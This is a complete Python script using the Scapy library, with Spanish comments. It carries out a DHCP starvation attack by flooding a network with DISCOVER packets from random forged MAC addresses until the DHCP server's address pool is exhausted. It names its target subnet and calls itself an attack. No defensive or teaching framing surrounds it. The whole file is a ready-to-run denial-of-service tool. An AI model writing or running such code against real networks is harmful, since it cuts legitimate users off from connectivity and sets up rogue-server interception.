# dhcp_starvation.py
from scapy.all import *
import random

# Configuración
target_ip = "255.255.255.255" # Broadcast
server_ip = "24.12.52.1"      # IP del Router legítimo (opcional, para unicast)

def random_mac():
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                        random.randint(0, 255),
                                        random.randint(0, 255))

def start_starvation():
    print("[*] Iniciando DHCP Starvation en la red 24.12.52.0/24...")
    print("[*] Presiona Ctrl+C para detener.")
    
    try:
        while True:
            mac_falsa = random_mac()
            xid_random = random.randint(1, 900000000)
            
            # Construcción del paquete DHCP DISCOVER
            # Ethernet -> IP -> UDP -> BOOTP -> DHCP
            ether = Ether(src=mac_falsa, dst="ff:ff:ff:ff:ff:ff")
            ip = IP(src="0.0.0.0", dst="255.255.255.255")
            udp = UDP(sport=68, dport=67)
            bootp = BOOTP(chaddr=mac2str(mac_falsa), xid=xid_random)
            
            # Opciones DHCP: Message Type 1 (Discover), Requested IP (Random para forzar)
            dhcp = DHCP(options=[("message-type", "discover"), "end"])
            
            packet = ether / ip / udp / bootp / dhcp
            
            # Enviar paquete
            sendp(packet, iface="eth0", verbose=0)
            # print(f"Solicitando IP con MAC: {mac_falsa}") # Descomentar para debug
            
    except KeyboardInterrupt:
        print("\n[!] Ataque detenido.")

if __name__ == "__main__":
    start_starvation()
